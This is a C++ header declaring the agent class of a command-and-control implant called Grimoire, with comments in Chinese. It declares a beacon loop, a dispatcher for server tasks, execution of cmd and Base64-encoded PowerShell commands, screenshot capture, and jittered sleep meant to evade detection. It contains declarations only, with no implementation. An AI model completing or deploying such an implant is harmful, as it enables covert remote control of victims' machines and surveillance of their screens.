//
// Created by Nebu1ea on 2025/11/25.
//

#ifndef GRIMOIRE_GRIMOIREAGENT_HPP
#define GRIMOIRE_GRIMOIREAGENT_HPP

#include <memory>
#include <string>
#include <vector>

#include "GrimoireCrypto.hpp"
#include "GrimoireComms.hpp"
// 引入 JSON 库
#include "nlohmann/json.hpp"

namespace Grimoire::Agent {

    // 引入了 Crypto 和 Comms 的命名空间
    using Crypto::GrimoireCrypto;
    using Comms::GrimoireComms;
    using json = nlohmann::json;

    class GrimoireAgent {
    public:
        /**
         * @brief 构造函数：初始化加密和通信模块。
         */
        GrimoireAgent();

        /**
         * @brief Beacon 的主循环。
         */
        void Run();

    private:
        // 核心依赖
        std::shared_ptr<GrimoireCrypto> crypto_manager_;
        std::unique_ptr<GrimoireComms> comms_manager_;


        const int SLEEP_TIME_SECONDS = 5; // 默认休眠时间
        const int JITTER_PERCENT = 20;    // 默认抖动百分比

        // --- 任务处理函数 ---

        /**
         * @brief 核心任务调度器，根据服务器任务类型进行分发。
         */
        std::vector<unsigned char> ProcessTask(const std::vector<unsigned char>& task_payload);

        /**
         * @brief 执行系统指令（支持 CMD 和 PowerShell Base64）
         * @param command 如果是 powershell，这里建议传入 Base64 编码后的指令字符串
         * @param shellType "cmd" 或 "powershell"
         */
        std::string ExecuteCommand(const std::string& command, const std::string& shellType);

        /**
         * @brief 截屏任务。
         * @return 原始 BMP/PNG 数据的字节数组。
         */
        std::vector<unsigned char> TakeScreenshot();

        /**
         * @brief 计算并执行带抖动 (Jitter) 的休眠。
         */
        void SleepWithJitter();
    };

} // namespace Grimoire::Agent


#endif //GRIMOIRE_GRIMOIREAGENT_HPP